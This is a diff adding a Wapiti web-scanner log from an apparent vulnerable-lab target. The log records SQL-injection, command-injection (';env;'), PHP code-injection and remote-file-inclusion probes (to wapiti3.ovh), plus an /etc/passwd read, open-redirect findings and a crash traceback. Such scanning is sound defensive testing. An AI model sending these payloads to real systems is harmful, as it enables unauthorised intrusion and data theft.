@@ -1,0 +1,398 @@
+2024-03-20 16:56:04.602 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz&form=submit (0)
+2024-03-20 16:56:04.734 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
+2024-03-20 16:56:04.734 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_d846a2a4.db
+2024-03-20 16:56:04.737 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 1 URLs and forms during the scan
+2024-03-20 16:56:04.767 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
+2024-03-20 16:56:04.768 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
+2024-03-20 16:56:04.775 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
+2024-03-20 16:56:04.876 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
+2024-03-20 16:56:04.876 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
+2024-03-20 16:56:04.890 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz&form=submit (0)
+2024-03-20 16:56:04.890 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz%C2%BF%27%22%28&form=submit (0)
+2024-03-20 16:56:04.898 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz&form=fuzz%C2%BF%27%22%28 (0)
+2024-03-20 16:56:04.918 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz%20AND%2030%3D117%20AND%2060%3D60&form=submit (0)
+2024-03-20 16:56:04.928 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz%20AND%2028%3D78%20AND%2036%3D36&form=submit (0)
+2024-03-20 16:56:04.938 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz%20AND%2049%3D49%20AND%2083%3D83&form=submit (0)
+2024-03-20 16:56:04.948 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz%27%20AND%2047%3D65%20AND%20%2760%27%3D%2760&form=submit (0)
+2024-03-20 16:56:05.042 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz%27%20AND%2085%3D172%20AND%20%2775%27%3D%2775&form=submit (0)
+2024-03-20 16:56:05.053 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz%27%20AND%2045%3D45%20AND%20%2771%27%3D%2771&form=submit (0)
+2024-03-20 16:56:05.061 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz%22%20AND%2018%3D33%20AND%20%2294%22%3D%2294&form=submit (0)
+2024-03-20 16:56:05.069 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz%22%20AND%2062%3D95%20AND%20%2219%22%3D%2219&form=submit (0)
+2024-03-20 16:56:05.078 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz%22%20AND%2077%3D77%20AND%20%2235%22%3D%2235&form=submit (0)
+2024-03-20 16:56:05.085 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz%29%20AND%2061%3D142%20AND%20%2815%3D15&form=submit (0)
+2024-03-20 16:56:05.093 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz%29%20AND%2044%3D60%20AND%20%2824%3D24&form=submit (0)
+2024-03-20 16:56:05.102 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz%29%20AND%2049%3D49%20AND%20%2847%3D47&form=submit (0)
+2024-03-20 16:56:05.110 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz%27%29%20AND%2010%3D84%20AND%20%28%2777%27%3D%2777&form=submit (0)
+2024-03-20 16:56:05.118 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz%27%29%20AND%2048%3D75%20AND%20%28%2756%27%3D%2756&form=submit (0)
+2024-03-20 16:56:05.126 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz%27%29%20AND%2077%3D77%20AND%20%28%2766%27%3D%2766&form=submit (0)
+2024-03-20 16:56:05.135 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz%22%29%20AND%2089%3D144%20AND%20%28%2291%22%3D%2291&form=submit (0)
+2024-03-20 16:56:05.143 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz%22%29%20AND%2021%3D71%20AND%20%28%2254%22%3D%2254&form=submit (0)
+2024-03-20 16:56:05.152 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz%22%29%20AND%2090%3D90%20AND%20%28%2294%22%3D%2294&form=submit (0)
+2024-03-20 16:56:05.159 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz&form=submit%20AND%2094%3D177%20AND%2015%3D15 (0)
+2024-03-20 16:56:05.168 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz&form=submit%27%20AND%2035%3D76%20AND%20%2789%27%3D%2789 (0)
+2024-03-20 16:56:05.180 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz&form=submit%22%20AND%2049%3D65%20AND%20%2244%22%3D%2244 (0)
+2024-03-20 16:56:05.192 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz&form=submit%29%20AND%2019%3D59%20AND%20%2847%3D47 (0)
+2024-03-20 16:56:05.203 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz&form=submit%27%29%20AND%2058%3D100%20AND%20%28%2773%27%3D%2773 (0)
+2024-03-20 16:56:05.213 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz&form=submit%22%29%20AND%2029%3D92%20AND%20%28%2257%22%3D%2257 (0)
+2024-03-20 16:56:05.250 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
+2024-03-20 16:56:05.269 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz&form=submit (0)
+2024-03-20 16:56:05.278 | RED      | wapitiCore.attack.mod_csp:attack:58 - CSP is not set
+2024-03-20 16:56:05.347 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
+2024-03-20 16:56:05.366 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz&form=submit (0)
+2024-03-20 16:56:05.403 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
+2024-03-20 16:56:05.440 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
+2024-03-20 16:56:05.455 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz&form=submit (0)
+2024-03-20 16:56:05.456 | BLUE     | wapitiCore.attack.mod_cookieflags:attack:55 - Checking cookie : PHPSESSID
+2024-03-20 16:56:05.456 | RED      | wapitiCore.attack.mod_cookieflags:attack:57 - HttpOnly flag is not set in the cookie : PHPSESSID
+2024-03-20 16:56:05.501 | RED      | wapitiCore.attack.mod_cookieflags:attack:66 - Secure flag is not set in the cookie : PHPSESSID
+2024-03-20 16:56:05.564 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
+2024-03-20 16:56:05.581 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz&form=submit (0)
+2024-03-20 16:56:05.585 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=%3Benv%3B&form=submit (0)
+2024-03-20 16:56:05.594 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=%7Cenv%7C&form=submit (0)
+2024-03-20 16:56:05.606 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=a%3Benv%3B&form=submit (0)
+2024-03-20 16:56:05.613 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=a%3Benv%3B&form=submit (0)
+2024-03-20 16:56:05.621 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&form=submit (0)
+2024-03-20 16:56:05.628 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz%3Benv%3B&form=submit (0)
+2024-03-20 16:56:05.636 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz%0Aenv%3B&form=submit (0)
+2024-03-20 16:56:05.643 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=%26set%26&form=submit (0)
+2024-03-20 16:56:05.651 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=set&form=submit (0)
+2024-03-20 16:56:05.658 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=env&form=submit (0)
+2024-03-20 16:56:05.666 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=%2Fe%00&form=submit (0)
+2024-03-20 16:56:05.673 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&form=submit (0)
+2024-03-20 16:56:05.680 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&form=submit (0)
+2024-03-20 16:56:05.688 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&form=submit (0)
+2024-03-20 16:56:05.696 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&form=submit (0)
+2024-03-20 16:56:05.704 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&form=submit (0)
+2024-03-20 16:56:05.711 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&form=submit (0)
+2024-03-20 16:56:05.719 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&form=submit (0)
+2024-03-20 16:56:05.726 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&form=submit (0)
+2024-03-20 16:56:05.734 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&form=submit (0)
+2024-03-20 16:56:05.741 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&form=submit (0)
+2024-03-20 16:56:05.748 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&form=submit (0)
+2024-03-20 16:56:05.756 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&form=submit (0)
+2024-03-20 16:56:05.763 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&form=submit (0)
+2024-03-20 16:56:05.770 | ERROR    | wapitiCore.controller.wapiti:attack:520 - InvalidURL
+Traceback (most recent call last):
+
+  File "/usr/local/bin/wapiti", line 8, in <module>
+    sys.exit(wapiti_asyncio_wrapper())
+    │   │    └ <function wapiti_asyncio_wrapper at 0x73e28d898900>
+    │   └ <built-in function exit>
+    └ <module 'sys' (built-in)>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti.py", line 395, in wapiti_asyncio_wrapper
+    asyncio.run(wapiti_main())
+    │       │   └ <function wapiti_main at 0x73e28d898860>
+    │       └ <function run at 0x73e292573560>
+    └ <module 'asyncio' from '/usr/local/lib/python3.11/asyncio/__init__.py'>
+  File "/usr/local/lib/python3.11/asyncio/runners.py", line 190, in run
+    return runner.run(main)
+           │      │   └ <coroutine object wapiti_main at 0x73e28dac7240>
+           │      └ <function Runner.run at 0x73e2923fefc0>
+           └ <asyncio.runners.Runner object at 0x73e292ef4b90>
+  File "/usr/local/lib/python3.11/asyncio/runners.py", line 118, in run
+    return self._loop.run_until_complete(task)
+           │    │     │                  └ <Task cancelling name='Task-1' coro=<wapiti_main() running at /usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti....
+           │    │     └ <function BaseEventLoop.run_until_complete at 0x73e2923fcc20>
+           │    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+           └ <asyncio.runners.Runner object at 0x73e292ef4b90>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 641, in run_until_complete
+    self.run_forever()
+    │    └ <function BaseEventLoop.run_forever at 0x73e2923fcb80>
+    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 608, in run_forever
+    self._run_once()
+    │    └ <function BaseEventLoop._run_once at 0x73e2923fe980>
+    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 1936, in _run_once
+    handle._run()
+    │      └ <function Handle._run at 0x73e29255ce00>
+    └ <Handle <TaskStepMethWrapper object at 0x73e28c234cd0>()>
+  File "/usr/local/lib/python3.11/asyncio/events.py", line 84, in _run
+    self._context.run(self._callback, *self._args)
+    │    │            │    │           │    └ <member '_args' of 'Handle' objects>
+    │    │            │    │           └ <Handle <TaskStepMethWrapper object at 0x73e28c234cd0>()>
+    │    │            │    └ <member '_callback' of 'Handle' objects>
+    │    │            └ <Handle <TaskStepMethWrapper object at 0x73e28c234cd0>()>
+    │    └ <member '_context' of 'Handle' objects>
+    └ <Handle <TaskStepMethWrapper object at 0x73e28c234cd0>()>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti.py", line 382, in wapiti_main
+    await wap.attack(global_stop_event)
+          │   │      └ <asyncio.locks.Event object at 0x73e28db37a50 [unset]>
+          │   └ <function Wapiti.attack at 0x73e28d902520>
+          └ <wapitiCore.controller.wapiti.Wapiti object at 0x73e28dbfcc90>
+> File "/usr/local/lib/python3.11/site-packages/wapitiCore/controller/wapiti.py", line 503, in attack
+    await attack_module.attack(original_request, original_response)
+          │             │      │                 └ <wapitiCore.net.response.Response object at 0x73e28c2685d0>
+          │             │      └ GET http://web/unvalidated_redir_fwd_1.php?url=fuzz&form=submit (0)
+          │             └ <function ModuleExec.attack at 0x73e28cbb60c0>
+          └ <wapitiCore.attack.mod_exec.ModuleExec object at 0x73e28cbc29d0>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/attack/mod_exec.py", line 101, in attack
+    response: Response = await self.crawler.async_send(mutated_request)
+    │                          │    │       │          └ GET http://web/unvalidated_redir_fwd_1.php?url=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&form=sub...
+    │                          │    │       └ <function AsyncCrawler.async_send at 0x73e291256020>
+    │                          │    └ <wapitiCore.net.crawler.AsyncCrawler object at 0x73e28d6e3d10>
+    │                          └ <wapitiCore.attack.mod_exec.ModuleExec object at 0x73e28cbc29d0>
+    └ <wapitiCore.net.response.Response object at 0x73e28c294610>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 386, in async_send
+    response = await self.async_get(request, headers=headers,
+                     │    │         │                └ None
+                     │    │         └ GET http://web/unvalidated_redir_fwd_1.php?url=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&form=sub...
+                     │    └ <function AsyncCrawler.async_get at 0x73e291256160>
+                     └ <wapitiCore.net.crawler.AsyncCrawler object at 0x73e28d6e3d10>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 59, in inner_wrapper
+    value = await function(*args, **kwargs)
+                  │         │       └ {'headers': None, 'follow_redirects': False, 'stream': False, 'timeout': None}
+                  │         └ (<wapitiCore.net.crawler.AsyncCrawler object at 0x73e28d6e3d10>, GET http://web/unvalidated_redir_fwd_1.php?url=data%3A%3Bbas...
+                  └ <function AsyncCrawler.async_get at 0x73e2912560c0>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 238, in async_get
+    response = await self._client.send(
+                     │    │       └ <function AsyncClient.send at 0x73e2917bd1c0>
+                     │    └ <httpx.AsyncClient object at 0x73e28da51050>
+                     └ <wapitiCore.net.crawler.AsyncCrawler object at 0x73e28d6e3d10>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1617, in send
+    response = await self._send_handling_auth(
+                     │    └ <function AsyncClient._send_handling_auth at 0x73e2917bd260>
+                     └ <httpx.AsyncClient object at 0x73e28da51050>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1645, in _send_handling_auth
+    response = await self._send_handling_redirects(
+                     │    └ <function AsyncClient._send_handling_redirects at 0x73e2917bd300>
+                     └ <httpx.AsyncClient object at 0x73e28da51050>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1703, in _send_handling_redirects
+    raise exc
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1692, in _send_handling_redirects
+    request = self._build_redirect_request(request, response)
+              │    │                       │        └ <Response [302 Found]>
+              │    │                       └ <Request('GET', 'http://web/unvalidated_redir_fwd_1.php?url=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3...
+              │    └ <function BaseClient._build_redirect_request at 0x73e2917afc40>
+              └ <httpx.AsyncClient object at 0x73e28da51050>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 465, in _build_redirect_request
+    url = self._redirect_url(request, response)
+          │    │             │        └ <Response [302 Found]>
+          │    │             └ <Request('GET', 'http://web/unvalidated_redir_fwd_1.php?url=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3...
+          │    └ <function BaseClient._redirect_url at 0x73e2917afd80>
+          └ <httpx.AsyncClient object at 0x73e28da51050>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 517, in _redirect_url
+    url = url.copy_with(host=request.url.host)
+          │   │              │       │   └ <property object at 0x73e291eb2160>
+          │   │              │       └ URL('http://web/unvalidated_redir_fwd_1.php?url=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&form=su...
+          │   │              └ <Request('GET', 'http://web/unvalidated_redir_fwd_1.php?url=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3...
+          │   └ <function URL.copy_with at 0x73e291ed18a0>
+          └ URL('data:;base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==')
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urls.py", line 348, in copy_with
+    return URL(self, **kwargs)
+           │   │       └ {'host': 'web'}
+           │   └ URL('data:;base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==')
+           └ <class 'httpx.URL'>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urls.py", line 115, in __init__
+    self._uri_reference = url._uri_reference.copy_with(**kwargs)
+    │                     │   │              │           └ {'host': 'web'}
+    │                     │   │              └ <function ParseResult.copy_with at 0x73e291ed0400>
+    │                     │   └ ParseResult(scheme='data', userinfo='', host='', port=None, path=';base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==', quer...
+    │                     └ URL('data:;base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==')
+    └ <unprintable URL object>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 134, in copy_with
+    return urlparse("", **defaults)
+           │              └ {'scheme': 'data', 'authority': '', 'path': ';base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==', 'query': None, 'fragment'...
+           └ <function urlparse at 0x73e291ed0220>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 252, in urlparse
+    validate_path(path, has_scheme=has_scheme, has_authority=has_authority)
+    │             │                │                         └ True
+    │             │                └ True
+    │             └ ';base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg=='
+    └ <function validate_path at 0x73e291ed0a40>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 369, in validate_path
+    raise InvalidURL("For absolute URLs, path must be empty or begin with '/'")
+          └ <class 'httpx.InvalidURL'>
+
+httpx.InvalidURL: For absolute URLs, path must be empty or begin with '/'
+2024-03-20 16:56:05.833 | INFO     | wapitiCore.controller.wapiti:send_bug_report:616 - Wapiti 3.1.8. httpx 0.24.1. OS linux
+2024-03-20 16:56:05.925 | SUCCESS  | wapitiCore.controller.wapiti:send_bug_report:627 - Sending crash report bde672fa-e6da-11ee-aacc-0242ac160004 ... SUCCESS
+2024-03-20 16:56:05.929 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
+2024-03-20 16:56:05.936 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz&form=submit (0)
+2024-03-20 16:56:05.937 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/unvalidated_redir_fwd_1.php?url=https%3A%2F%2Fopenbugbounty.org%2F&form=submit
+2024-03-20 16:56:06.007 | RED      | wapitiCore.attack.mod_redirect:attack:79 - ---
+2024-03-20 16:56:06.007 | RED      | wapitiCore.attack.mod_redirect:attack:80 - Open Redirect in http://web/unvalidated_redir_fwd_1.php via injection in the query string
+2024-03-20 16:56:06.007 | RED      | wapitiCore.attack.mod_redirect:attack:86 - Evil request:
+2024-03-20 16:56:06.008 | RED      | wapitiCore.attack.mod_redirect:attack:87 -     GET /unvalidated_redir_fwd_1.php?url=https%3A%2F%2Fopenbugbounty.org%2F&form=submit HTTP/1.1
+    host: web
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: security_level=0
+2024-03-20 16:56:06.008 | RED      | wapitiCore.attack.mod_redirect:attack:88 - ---
+2024-03-20 16:56:06.008 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/unvalidated_redir_fwd_1.php?url=%2F%2Fopenbugbounty.org%2F&form=submit
+2024-03-20 16:56:06.074 | RED      | wapitiCore.attack.mod_redirect:attack:79 - ---
+2024-03-20 16:56:06.074 | RED      | wapitiCore.attack.mod_redirect:attack:80 - Open Redirect in http://web/unvalidated_redir_fwd_1.php via injection in the query string
+2024-03-20 16:56:06.074 | RED      | wapitiCore.attack.mod_redirect:attack:86 - Evil request:
+2024-03-20 16:56:06.075 | RED      | wapitiCore.attack.mod_redirect:attack:87 -     GET /unvalidated_redir_fwd_1.php?url=%2F%2Fopenbugbounty.org%2F&form=submit HTTP/1.1
+    host: web
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: security_level=0
+2024-03-20 16:56:06.075 | RED      | wapitiCore.attack.mod_redirect:attack:88 - ---
+2024-03-20 16:56:06.075 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/unvalidated_redir_fwd_1.php?url=fuzz&form=https%3A%2F%2Fopenbugbounty.org%2F
+2024-03-20 16:56:06.088 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/unvalidated_redir_fwd_1.php?url=fuzz&form=%2F%2Fopenbugbounty.org%2F
+2024-03-20 16:56:06.115 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
+2024-03-20 16:56:06.132 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz&form=submit (0)
+2024-03-20 16:56:06.145 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
+2024-03-20 16:56:06.145 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
+2024-03-20 16:56:06.207 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
+2024-03-20 16:56:06.207 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
+2024-03-20 16:56:06.291 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
+2024-03-20 16:56:06.306 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/unvalidated_redir_fwd_1.php?url=fuzz&form=submit (0)
+2024-03-20 16:56:06.311 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&form=submit (0)
+2024-03-20 16:56:06.322 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&form=submit (0)
+2024-03-20 16:56:06.333 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/unvalidated_redir_fwd_1.php?url=%2Fetc%2Fpasswd&form=submit (0)
